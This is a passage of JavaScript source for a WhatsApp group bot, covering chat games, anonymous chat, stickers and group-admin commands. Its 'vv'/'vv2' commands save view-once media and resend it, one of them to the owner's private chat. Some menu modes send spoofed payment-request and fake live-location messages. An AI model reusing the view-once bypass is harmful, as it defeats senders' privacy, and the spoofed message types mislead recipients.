        conn.caklontong = conn.caklontong ? conn.caklontong : {}
        if (isGroup && from in conn.caklontong) {
            if (!isGroup) {
                return
            }
            const similarity = require('similarity')
            const threshold = 0.72
            let id = m.chat
            let json = JSON.parse(JSON.stringify(conn.caklontong[id][1]))

            if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
                global.db.data.users[m.sender].exp += conn.caklontong[id][2]
                // global.db.data.users[m.sender].tiketcoin += 1
                setReply(`*Benar!*\n+${conn.caklontong[id][2]} XP\n+1500 Money\n${json.deskripsi}`)
                clearTimeout(conn.caklontong[id][3])
                delete conn.caklontong[id]
            } else if (similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
            // else setReply(`*Salah!*`)

        }


        //GAME tebak Lagu Function
        conn.tebaklagu = conn.tebaklagu ? conn.tebaklagu : {}
        if (isGroup && from in conn.tebaklagu) {
            if (!isGroup) {
                return
            }
            const similarity = require('similarity')
            const threshold = 0.72
            let id = m.chat
            let json = JSON.parse(JSON.stringify(conn.tebaklagu[id][1]))

            if (budy.toLowerCase() == json.judul.toLowerCase().trim()) {
                user.balance += conn.tebaklagu[id][2]
                var teks4 = `*GAME TEBAK LAGU*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebaklagu[id][2]} Money 💸`
                reply(teks4)
                clearTimeout(conn.tebaklagu[id][3])
                delete conn.tebaklagu[id]
            } else if (similarity(budy.toLowerCase(), json.judul.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
            // else setReply(`*Salah!*`)

        }


        //GAME tebaktebak Function
        conn.tebaktebak = conn.tebaktebak ? conn.tebaktebak : {}
        if (isGroup && from in conn.tebaktebak) {
            if (!isGroup) {
                return
            }
            const similarity = require('similarity')
            const threshold = 0.72
            let id = m.chat
            let json = JSON.parse(JSON.stringify(conn.tebaktebak[id][1]))

            if (budy.toLowerCase() == json.jawaban.toLowerCase().trim()) {
                user.balance += conn.tebaktebak[id][2]
                global.db.data.users[m.sender].exp += 50
                var teks5 = `*TEBAK TEBAKAN*\n\nJawaban Kamu Benar!\n Hadiah : +${conn.tebaktebak[id][2]} Money 💸\n EXP: +50`
                // global.db.data.users[m.sender].tiketcoin += 1
                reply(teks5)
                clearTimeout(conn.tebaktebak[id][3])
                delete conn.tebaktebak[id]
            } else if (similarity(budy.toLowerCase(), json.jawaban.toLowerCase().trim()) >= threshold) setReply(`*Dikit Lagi!*`)
            // else setReply(`*Salah!*`)

        }
        //Game Family 100
        conn.family = conn.family ? conn.family : {}
        if (isGroup && from in conn.family) {
            if (!isGroup) {
                return
            }
            let similarity = require('similarity')
            let threshold = 0.72 // semakin tinggi nilai, semakin mirip
            let id = m.chat
            let room = conn.family[id]
            let textG = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
            let isSurrender = /^((me)?nyerah|surr?ender)$/i.test(budy)
            if (!isSurrender) {
                let index = room.jawaban.indexOf(textG)

                if (index < 0) {
                    if (Math.max(...room.jawaban.filter((_, index) => !room.terjawab[index]).map(jawaban => similarity(jawaban, textG))) >= threshold) return setReply('Dikit lagi!')
                }
                if (!isCmd && room.terjawab[index]) {
                    return
                }
                user.balance += room.winScore
                room.terjawab[index] = m.sender
            }
            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length

            let caption = `*GAME FAMILY100*

*Soal:* ${room.soal}

Terdapat ${room.jawaban.length} jawaban${room.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}
${isWin ? `*SEMUA JAWABAN TERJAWAB ✅*` : isSurrender ? '*MENYERAH ❌*' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
 return isSurrender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '✓ ' + room.terjawab[index].split('@')[0]  : ''}`.trim() : false
 }).filter(v => v).join('\n')}

${isSurrender ? '' : `+${room.winScore} Money tiap jawaban benar`}
     `.trim()

            conn.sendMessage(from, {
                text: `${caption}`,
                mentions: [room.terjawab + '@s.whatsapp.net']
            }, {
                quoted: dev
            }).then(msg => {
                conn.family[id].msg = msg
            }).catch(_ => _)
            if (isWin || isSurrender) delete conn.family[id]
            //if (isWin || isSurrender) clearTimeout(200000)
        }
        /*/AUTO BLOCK NOMER ASING +212
        let nomerAsing = senderNumber.startsWith('212')
        if (nomerAsing) {
        if(!db.data.users[sender].banned.status) {
        db.data.users[sender].banned.status = true
        db.data.users[sender].banned.reason = "Nomer asing +212"
        }
        console.log(`Nomer asing dari ${senderNumber}`)
        await reply("you are not allowed to using this bot")
        if(!isGroup) await conn.sendMessage(from, {text: "stupid"},{quoted: lep})
        await conn.chatModify({delete: true,lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]},sender)
        return conn.updateBlockStatus(sender, "block") 
        } 
        	*/

        //sendFileUrl
        const sendFileFromUrl = async (from, url, caption, dev, men) => {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            if (mime.split("/")[1] === "gif") {
                return conn.sendMessage(from, {
                    video: await convertGif(url),
                    caption: caption,
                    gifPlayback: true,
                    mentions: men ? men : []
                }, {
                    quoted: dev
                })
            }
            let type = mime.split("/")[0] + "Message"
            if (mime.split("/")[0] === "image") {
                return conn.sendMessage(from, {
                    image: await getBuffer(url),
                    caption: caption,
                    mentions: men ? men : []
                }, {
                    quoted: dev
                })
            } else if (mime.split("/")[0] === "video") {
                return conn.sendMessage(from, {
                    video: await getBuffer(url),
                    caption: caption,
                    mentions: men ? men : []
                }, {
                    quoted: dev
                })
            } else if (mime.split("/")[0] === "audio") {
                return conn.sendMessage(from, {
                    audio: await getBuffer(url),
                    caption: caption,
                    mentions: men ? men : [],
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: dev
                })
            } else {
                return conn.sendMessage(from, {
                    document: await getBuffer(url),
                    mimetype: mime,
                    caption: caption,
                    mentions: men ? men : []
                }, {
                    quoted: dev
                })
            }
        }

        //ANONYMOUS CHAT
        const roomChat = Object.values(anonChat).find(room => [room.a, room.b].includes(m.sender) && room.state == 'CHATTING')
        const roomA = Object.values(anonChat).find(room => room.a == m.sender)
        const roomB = Object.values(anonChat).find(room => room.b == m.sender)
        const room = Object.values(anonChat).find(room => room.state == 'WAITING' && room.b == "")

        if (roomChat && !isCmd && !isGroup && roomChat.b !== "") {
            //let nono = m.quoted.fakeObj? m.quoted.fakeObj : m
            let other = [roomChat.a, roomChat.b].find(user => user !== m.sender)
            m.copyNForward(other, true)
        }

        if (room && Date.now() >= room.expired) {

            await conn.sendMessage(room.a, {
                text: "Partner tidak di temukan\nKamu telah keluar dari room anonymous"
            })
            anonChat.splice(anonChat.indexOf(room, 1))
        }
        //Suit PvP
        conn.suit = conn.suit ? conn.suit : {}
        let roof = Object.values(conn.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(sender))
        if (roof) {
            let win = ''
            let tie = false
            if (sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(budy) && isGroup && roof.status == 'wait') {
                if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(budy)) {
                    conn.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, dev)
                    delete conn.suit[roof.id]
                    return !0
                }
                roof.status = 'play'
                roof.asal = m.chat
                clearTimeout(roof.waktu)
                //delete roof[roof.id].waktu
                conn.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, {
                    mentions: [roof.p, roof.p2]
                })
                if (!roof.pilih) conn.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
                if (!roof.pilih2) conn.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
                roof.waktu_milih = setTimeout(() => {
                    if (!roof.pilih && !roof.pilih2) conn.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
                    else if (!roof.pilih || !roof.pilih2) {
                        win = !roof.pilih ? roof.p2 : roof.p
                        conn.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
                    }
                    delete conn.suit[roof.id]
                    return !0
                }, roof.timeout)
            }
            let jwb = sender == roof.p
            let jwb2 = sender == roof.p2
            let g = /gunting/i
            let b = /batu/i
            let k = /kertas/i
            let reg = /^(gunting|batu|kertas)/i
            if (jwb && reg.test(budy) && !roof.pilih && !isGroup) {
                roof.pilih = reg.exec(budy.toLowerCase())[0]
                roof.text = budy
                setReply(`Kamu telah memilih ${budy} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
                if (!roof.pilih2) conn.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
            }
            if (jwb2 && reg.test(budy) && !roof.pilih2 && !isGroup) {
                roof.pilih2 = reg.exec(budy.toLowerCase())[0]
                roof.text2 = budy
                setReply(`Kamu telah memilih ${budy} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
                if (!roof.pilih) conn.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
            }
            let stage = roof.pilih
            let stage2 = roof.pilih2
            if (roof.pilih && roof.pilih2) {
                clearTimeout(roof.waktu_milih)
                if (b.test(stage) && g.test(stage2)) win = roof.p
                else if (b.test(stage) && k.test(stage2)) win = roof.p2
                else if (g.test(stage) && k.test(stage2)) win = roof.p
                else if (g.test(stage) && b.test(stage2)) win = roof.p2
                else if (k.test(stage) && b.test(stage2)) win = roof.p
                else if (k.test(stage) && g.test(stage2)) win = roof.p2
                else if (stage == stage2) tie = true
                conn.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, {
                    mentions: [roof.p, roof.p2]
                })
                delete conn.suit[roof.id]
            }
        }




        //TicTacToei

        conn.tictac = conn.tictac ? conn.tictac : {}
        let roomf = Object.values(conn.tictac).find(roomf => roomf.id && roomf.tictac && roomf.state && roomf.id.startsWith('tictactoe') && [roomf.tictac.playerX, roomf.tictac.playerO].includes(sender) && roomf.state == 'PLAYING')
        if (roomf) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // reply(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(budy)) return
            isSurrender = !/^[1-9]$/.test(budy)
            if (sender !== roomf.tictac.currentTurn) { // nek wayahku
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = roomf.tictac.turn(sender === roomf.tictac.playerO, parseInt(budy) - 1))) {
                setReply({
                    '-3': '*TICTACTOE TELAH BERAKHIR*',
                    '-2': '*INVALID*',
                    '-1': '*POSISI INVALID*',
                    0: 'Posisi Invalid',
                } [ok])
                return !0
            }
            if (sender === roomf.tictac.winner) isWin = true
            else if (roomf.tictac.board === 511) isTie = true
            let arr = roomf.tictac.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                roomf.tictac._currentTurn = sender === roomf.tictac.playerX
                isWin = true
            }
            let winner = isSurrender ? roomf.tictac.currentTurn : roomf.tictac.winner
            let str = `*TICTACTOE*

 ID: ${roomf.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} *MENANG!*` : isTie ? `*HASIL SERI*` : `Giliran ${['❌', '⭕'][1 * roomf.tictac._currentTurn]} (@${roomf.tictac.currentTurn.split('@')[0]})`}
❌: @${roomf.tictac.playerX.split('@')[0]}
⭕: @${roomf.tictac.playerO.split('@')[0]}

`
            if ((roomf.tictac._currentTurn ^ isSurrender ? roomf.x : roomf.o) !== m.chat)
                roomf[roomf.tictac._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
            if (roomf.x !== roomf.o) conn.sendText(roomf.x, str, m, {
                mentions: parseMention(str)
            })
            conn.sendText(roomf.o, str, m, {
                mentions: parseMention(str)
            })
            if (isTie || isWin) {
                delete conn.tictac[roomf.id]
            }
        }
        async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
            const {
                default: {
                    Image
                }
            } = await import('node-webpmux')
            const img = new Image()
            const json = {
                'sticker-pack-id': 'parel-kntll',
                'sticker-pack-name': packname,
                'sticker-pack-publisher': author,
                'emojis': categories,
                'is-avatar-sticker': 1,
                ...extra
            }
            let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
            let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
            let exif = Buffer.concat([exifAttr, jsonBuffer])
            exif.writeUIntLE(jsonBuffer.length, 14, 4)
            await img.load(buffer)
            img.exif = exif
            return await img.save(null)
        }

        conn.sendImageAsSticker = async (jid, media, m, options = {}) => {
            let {
                Sticker,
                StickerTypes
            } = require('wa-sticker-formatter')
            const getRandom = (ext) => {
                return `${Math.floor(Math.random() * 10000)}${ext}`
            }
            let jancok = new Sticker(media, {
                pack: global.packname, // The pack name
                author: global.author, // The author name
                type: StickerTypes.FULL, // The sticker type
                categories: ['🤩', '🎉'], // The sticker category
                id: '12345', // The sticker id
                quality: 50, // The quality of the output file
                background: '#FFFFFF00' // The sticker background color (only for full stickers)
            })
            let stok = getRandom(".webp")
            let nono = await jancok.toFile(stok)
            let nah = fs.readFileSync(nono)
            await conn.sendMessage(jid, {
                sticker: nah
            }, {
                quoted: m
            })
            return await fs.unlinkSync(stok)
        }
if (isCommandx) {
    try {
        const response = await fetch('https://huggingface.co/spaces/BLUESERVER/DATABASE/raw/main/banned.json');
        if (!response.ok) throw new Error(`Failed to fetch banned database. Status: ${response.status}`);

        const bannedNumbers = await response.json();
        const senderNumber = m.sender.split('@')[0]; // Extract number without domain

        // Stop processing further if the sender is banned
        if (bannedNumbers.includes(senderNumber)) return;

    } catch (error) {
        console.error("Error fetching banned database:", error);
    }
}
        try {
            switch (command) {
                case 'self':
                    if (!isOwner) return setReply(mess.only.owner);
                    await loading()
                    if (publik == false) return setReply('*`IT IS ALREADY IN SELF MODE`*');
                    publik = false;
                    let breh = `*\`SELF MODE IS NOW ACTIVE\`*`;
                    setReply(breh);
                    break;
                case 'public':
                    if (!isOwner) return setReply(mess.only.owner);
                    await loading()
                    if (publik) return setReply('*`IT IS ALREADY IN PUBLIC MODE`*');
                    publik = true;
                    let bab = `*\`PUBLIC MODE IS NOW ACTIVE\`*`;
                    setReply(bab);
                    break;
                case 'mode':
                    if (!isOwner) return setReply(mess.only.owner);
                    await loading()
                    let modeStatus = publik ? '`THE BOT IS CURRENTLY IN PUBLIC MODE.`' : '`THE BOT IS CURRENTLY IN PRIVATE MODE.`';
                    setReply(modeStatus);
                    break;
                case 'menu':
                case 'bluemenu': {
                    await loading()
                    let {
                        allmenu,
                        fitur
                    } = require('./help')
                    let menunya = allmenu(limitCount, isPremium, publik, sender, prefix, pushname)
                    let fiturnya = fitur()
                    let data = global.db.data.others['runtime']
                    let time = (new Date - data.runtime) || "Not detected"
                    //let rm = pickRandom(pdf)
                    if (setmenu == "document") {
                        conn.sendMessage(m.chat, {
                            document: fs.readFileSync("./package.json"),
                            fileName: wm,
                            mimetype: "application/vnd.ms-powerpoint",
                            jpegThumbnail: fs.readFileSync("./database/blueimages/thumb.jpeg"),
                            caption: menunya + fiturnya,
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: botName,
                                    body: `${ucapanWaktu} ${pushname}`,
                                    thumbnail: fs.readFileSync('./database/blueimages/thumb.jpeg'),
                                    thumbnailUrl: await pickRandom(fotoRandom),
                                    sourceUrl: web,
                                    mediaType: 1,
                                    renderLargerThumbnail: true
                                }
                            }
                        }, {
                            quoted: m,
                            ephemeralExpiration: 86400
                        });
                    } else if (setmenu == "image") {

                        conn.sendMessage(from, {
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: `${botName}`,
                                    body: `🎄𝙼𝙴𝚁𝚁𝚈 𝙲𝙷𝚁𝙸𝚂𝚃𝙼𝙰𝚂🎄`,
                                    previewType: "PHOTO",
                                    thumbnailUrl: pickRandom(fotoRandom),
                                    sourceUrl: `${web}`
                                }
                            },
                            image: fs.readFileSync('./database/blueimages/thumb.jpeg'),
                            caption: menunya + fiturnya
                        }, {
                            quoted: ftoko
                        })
                    } else if (setmenu == "gif") {
                        conn.sendMessage(m.chat, {
                            video: fs.readFileSync('./database/blueimages/video1.mp4'),
                            gifPlayback: true,
                            caption: fiturnya,
                            contextInfo: {
                                externalAdReply: {
                                    containsAutoReply: true,
                                    mediaType: 1,
                                    //mediaUrl: 'https://telegra.ph/file/803e9b20c514befd3cffa.jpg',
                                    renderLargerThumbnail: true,
                                    showAdAttribution: true,
                                    sourceUrl: "https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h",
                                    thumbnailUrl: pickRandom(fotoRandom),
                                    title: wm,
                                    body: `${ucapanWaktu} ${pushname}`,
                                },
                            },
                        }, {
                            quoted: m
                        });
                    } else if (setmenu == "katalog") {
                        conn.relayMessage(m.chat, {
                            requestPaymentMessage: {
                                currencyCodeIso4217: 'INR',
                                amount1000: 1234567,
                                requestFrom: m.sender,
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: menunya + fiturnya,
                                        contextInfo: {
                                            externalAdReply: {
                                                showAdAttribution: true
                                            }
                                        }
                                    }
                                }
                            }
                        }, {})
                    } else if (setmenu == "thumbnail") {
                        conn.sendMessage(from, {
                            contextInfo: {
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: `${week} , ${calender}`,
                                    body: `${botName}`,
                                    mediaType: 1,
                                    renderLargerThumbnail: true,
                                    thumbnailUrl: pickRandom(fotoRandom),
                                    sourceUrl: `${web}`
                                }
                            },
                            text: menunya + fiturnya
                        }, {
                            quoted: m
                        })
                    } else if (setmenu == "payment") {
                        let numb = ["7.76", "15.48", "8.92", "10.72", "13.48", "4.39", "5.99", "2.56"]
                        let amont = numb[Math.floor(Math.random() * numb.length)]
                        conn.relayMessage(from, {
                            requestPaymentMessage: {
                                expiryTimestamp: 0,
                                currencyCodeIso4217: 'USD',
                                amount1000: (amont) * 1000,
                                requestFrom: `${sender.split('@')[0]}@s.whatsapp.net`,
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: menunya + fiturnya,
                                        contextInfo: {
                                            mentionedJid: [m.sender],
                                            externalAdReply: {
                                                showAdAttribution: true,
                                            }
                                        }
                                    }
                                }
                            }
                        }, {})
                    } else if (setmenu == "livelocation") {
                        conn.relayMessage(from, {
                            liveLocationMessage: {
                                degreesLatitude: 35.676570,
                                degreesLongitude: 139.762148,
                                caption: menunya + fiturnya,
                                sequenceNumber: 1656662972682001,
                                timeOffset: 8600,
                                jpegThumbnail: null,
                                contextInfo: {
                                    mentionedJid: [m.sender],
                                    externalAdReply: {
                                        containsAutoReply: true,
                                        showAdAttribution: true,
                                    }
                                }
                            }
                        }, {
                            quoted: m
                        })
                    }
                    await sleep(1500)
                    sendvn(dmusic)
                }
                break
                case 'tagall': {
                    if (!isGroup) return setReply(mess.only.group);
                    if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin);

                    try {
                        // Notify that tagging is in progress
                        await loading();

                        // Fetch group metadata
                        const groupMetadata = await conn.groupMetadata(m.chat);
                        const participants = groupMetadata.participants;

                        // Extract all participant IDs and prepare the mentions
                        const mentions = participants.map(p => p.id);
                        const participantsList = participants.map(participant =>
                            `${themeemoji} @${participant.id.split('@')[0]}`
                        ).join('\n');

                        const message = `🐦‍🔥 *\`${pushname} 𝐒𝐮𝐦𝐦𝐨𝐧𝐬\`* 🐦‍🔥\n\n${participantsList}\n> 𝐁𝐋𝐔𝐄𝐃𝐄𝐌𝐎𝐍 𝐓𝐄𝐂𝐇`;

                        // Send the tag message as a reply
                        reply(message, {
                            mentions
                        });

                        // Send a confirmation message
                    } catch (error) {
                        console.error(error);
                        reply("An error occurred while tagging everyone.");
                    }
                    break;
                }
                case 'tag': {
                    if (!isGroup) return setReply(mess.only.group);

                    // Check if the user is an admin, group owner, bot owner, or premium user
                    if (!isAdmins && !isOwner) {
                        return setReply(mess.only.admin);
                    }

                    // Check if there's a quoted message or text input
                    let quotedMessage;
                    if (m.quoted) {
                        quotedMessage = m.quoted.text; // Use quoted message text
                    } else if (q) {
                        quotedMessage = q; // Use provided text
                    } else {
                        quotedMessage = `${themeemoji}${themeemoji}${themeemoji}`; // Default emoji message
                    }

                    // Send the message tagging all participants
                    await conn.sendMessage(m.chat, {
                        text: quotedMessage,
                        mentions: participants.map(a => a.id) // Tag all participants
                    });

                    break;
                }
                case 'addowner': {
                    if (!isOwner) return setReply(mess.only.owner);

                    // Ensure Input is a string and contains '@' symbol
                    if (!Input || typeof Input !== 'string' || !Input.includes('@')) {
                        return setReply("Please provide a valid user ID (e.g., user@domain.com).");
                    }

                    if (checkDataId("owner", Input, DataId)) return setReply("User is already an owner");

                    if (!checkDataName("owner", Input, DataId)) {
                        await createDataId("owner", DataId);
                    }

                    addDataId(Input, "owner", DataId);
                    setReply(`Successfully added ${Input.split("@")[0]} to the owner list`);
                }
                break;
                case 'delowner': {
                    if (!isOwner) return setReply(mess.only.owner);

                    try {
                        if (!Input) return setReply("Please provide a valid user ID to remove.");

                        // Ensure Input is a string and properly formatted
                        if (typeof Input !== 'string' || !Input.includes('@')) {
                            return setReply("Invalid input format. Please provide a valid user ID (e.g., user@domain.com).");
                        }

                        // Check if the user is an owner
                        if (!checkDataId("owner", Input, DataId)) {
                            return setReply("User is not an owner.");
                        }

                        // Remove the user from the owner list
                        removeDataId("owner", Input, DataId);

                        // Send confirmation message
                        setReply(`Successfully removed ${Input.split("@")[0]} from the owner list.`);
                    } catch (err) {
                        console.log(err);
                        setReply(`An error occurred: ${err.message}`);
                    }
                }
                break;
                case 'listowner': {
                    if (!isOwner) return setReply(mess.only.owner)
                    await loading()
                    if (!checkDataName("owner", q, DataId)) {
                        await createDataId("owner", DataId);
                    }

                    let nana = await DataId.filter(item => item.name == "owner");
                    if (!nana || nana.length === 0) return setReply("No owners found");

                    let teks = "List of Owners:\n";
                    let nunu = nana[0].id;

                    // Ensure nunu is an array of strings
                    if (Array.isArray(nunu)) {
                        for (let i of nunu) {
                            if (typeof i === 'string') {
                                teks += `- wa.me/${i.split("@")[0]} \n`;
                            } else {
                                console.error("Invalid value in owner list:", i);
                            }
                        }
                    } else {
                        console.error("Invalid 'id' value:", nunu);
                    }

                    setReply(teks);
                }
                break;
                case 'ping': {
                    const startTime = performance.now();

                    // Send a preliminary message
                    const initialMessage = await conn.sendMessage(m.chat, {
                        text: `*⚡𝙲𝙰𝙻𝙲𝚄𝙻𝙰𝚃𝙸𝙽𝙶 𝚂𝙿𝙴𝙴𝙳⚡*\n🔃\n> ${botName}`
                    });

                    const endTime = performance.now();
                    const latency = (endTime - startTime).toFixed(3); // Calculate the latency in milliseconds

                    // Define ping rating based on latency
                    let pingStatus = '';
                    if (latency < 50) {
                        pingStatus = '🚀 𝙴𝚡𝚌𝚎𝚕𝚕𝚎𝚗𝚝 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚘𝚗';
                    } else if (latency < 100) {
                        pingStatus = '⚡ 𝙶𝚘𝚘𝚍 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚘𝚗';
                    } else if (latency < 200) {
                        pingStatus = '👌 𝙵𝚊𝚒𝚛 𝚜𝚙𝚎𝚎𝚍';
                    } else {
                        pingStatus = '🐢 𝙿𝚘𝚘𝚛 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚘𝚗';
                    }

                    // Prepare the final message with results
                    const finalMessage = `*\`𝙳𝙴𝙼𝙾𝙽 𝙱𝙾𝚃 𝚂𝙿𝙴𝙴𝙳\`*\n *𝙿𝚒𝚗𝚐* ${latency}𝙼𝚜\n*Status:* *${pingStatus}*\n> ${caption}`;

                    // Update the previous message with the final results
                    await conn.relayMessage(m.chat, {
                        protocolMessage: {
                            key: initialMessage.key,
                            type: 14, // Protocol type for editing messages
                            editedMessage: {
                                conversation: finalMessage
                            }
                        }
                    }, {});

                    break;
                }
                case 'delete':
                case 'del':
                case 'd': {
                    if (!isOwner) return reply(mess.only.owner); // Ensure only the owner can delete messages
                    if (!m.quoted) return; // Exit if there is no quoted message

                    try {
                        // Delete the quoted message
                        await conn.sendMessage(m.chat, {
                            delete: {
                                remoteJid: m.chat, // The chat from which to delete the message
                                fromMe: false, // Set to false to delete others' messages
                                id: m.quoted.id, // The ID of the quoted message
                                participant: m.quoted.sender // The sender of the quoted message
                            }
                        });

                        // Delete the command message itself
                        await conn.sendMessage(m.chat, {
                            delete: {
                                remoteJid: m.chat, // The chat from which to delete the message
                                fromMe: true, // Set to true to delete the bot's message (command message)
                                id: m.id // The ID of the current command message
                            }
                        });
                    } catch (err) {
                        console.log("Error while deleting messages:", err); // Log any errors for debugging
                    }
                }
                break;
                case 'read':
                case 'vv': {
                    const {
                        downloadContentFromMessage
                    } = require('@whiskeysockets/baileys')
                    await loading()
                    if (!m.quoted) return setReply(`Reply to view once message`)
                    if (m.quoted.mtype !== 'viewOnceMessageV2') return setReply(`This is not a view once message`)
                    let msg = m.quoted.message
                    let type = Object.keys(msg)[0]
                    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
                    let buffer = Buffer.from([])
                    for await (const chunk of media) {
                        buffer = Buffer.concat([buffer, chunk])
                    }
                    if (/video/.test(type)) {
                        return conn.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
                    } else if (/image/.test(type)) {
                        return conn.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
                    }
                }
                break
                case 'vv2': {
                    if (!isOwner) return setReply(mess.only.owner)
                    const {
                        downloadContentFromMessage
                    } = require('@whiskeysockets/baileys');
                    await loading();

                    if (!m.quoted) return setReply(`Reply to view once message`);
                    if (m.quoted.mtype !== 'viewOnceMessageV2') return setReply(`This is not a view once message`);

                    try {
                        let msg = m.quoted.message;
                        let type = Object.keys(msg)[0];
                        let media = await downloadContentFromMessage(msg[type], type === 'imageMessage' ? 'image' : 'video');
                        let buffer = Buffer.from([]);

                        for await (const chunk of media) {
                            buffer = Buffer.concat([buffer, chunk]);
                        }

                        let fileType = /video/.test(type) ? 'media.mp4' : 'media.jpg';
                        let caption = msg[type]?.caption || `${botName}`;

                        // Send the file to your own DM (m.sender)
                        await conn.sendMessage(m.sender, {
                            [fileType === 'media.mp4' ? 'video' : 'image']: buffer,
                            caption: caption,
                        });
                    } catch (error) {
                        console.error("Error in read case:", error);
                        reply("An error occurred while processing the view once message. Please try again later.");
                    }
                    break;
                }
                case 'runtime': {
                    let data = global.db.data.others['runtime']
                    let time = (new Date - data.runtime) || 'long time'
                    setReply(`${themeemoji} \`RUNTIME\` ${themeemoji}\n*${runtime(process.uptime())}*`)
                }
                break
                case 'kick': {
    if (!isGroup) return setReply(mess.only.group); // Ensure the command is used in a group
    await loading();
    if (!isBotGroupAdmins) return setReply(mess.only.Badmin); // Ensure bot is a group admin
    if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin); // Ensure the user is an admin or owner

    let mentioned = [];
    if (m.quoted) {
        // If replying to a user's message, add their ID
        mentioned = [m.quoted.sender];
    } else if (mentionByTag && mentionByTag.length > 0) {
        // If tagging users, add their IDs
        mentioned = mentionByTag;
    } else if (args[0]) {
        // If providing a number, format it to a WhatsApp ID
        mentioned = [`${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net`];
    }

    if (mentioned.length === 0) {
        return setReply('Please reply to a user, tag someone, or provide a number to kick.');
    }

    try {
        await conn.groupParticipantsUpdate(m.chat, mentioned, 'remove'); // Kick the mentioned users
        setReply(`Successfully kicked ${mentioned.map(v => `@${v.split('@')[0]}`).join(', ')}`, { mentions: mentioned });
    } catch (error) {
        console.error('Error in kick case:', error);
        setReply('Failed to kick the user. Make sure I have the correct permissions.');
    }
    break;
}
                case 'add': {
                    if (!isGroup) return setReply(mess.only.group);
                    if (!isBotGroupAdmins) return setReply(mess.only.Badmin);
                    if (!isGroupAdmins && !isOwner) return setReply(mess.only.admin);
                    await loading()
                    // Get the number from args or the replied message
                    let number;
                    if (args[0]) {
                        number = args[0].replace(/[^0-9]/g, ''); // Extract only numbers
                    } else if (m.quoted && m.quoted.sender) {
                        number = m.quoted.sender.split('@')[0]; // Get number from replied message
                    } else {
                        return setReply('Please provide a number or reply to a user to add.');
                    }

                    const user = number.includes('@s.whatsapp.net') ? number : `${number}@s.whatsapp.net`;

                    try {
                        await conn.groupParticipantsUpdate(m.chat, [user], 'add'); // Add user to group
                        await conn.sendMessage(m.chat, {
                            text: `Successfully added @${number}`,
                            mentions: [user]
                        }, {
                            quoted: m
                        });
                    } catch (error) {
                        setReply('Failed to add the user. Make sure the number is valid and I have the correct permissions.');
                        console.error(error);
                    }
                    break;
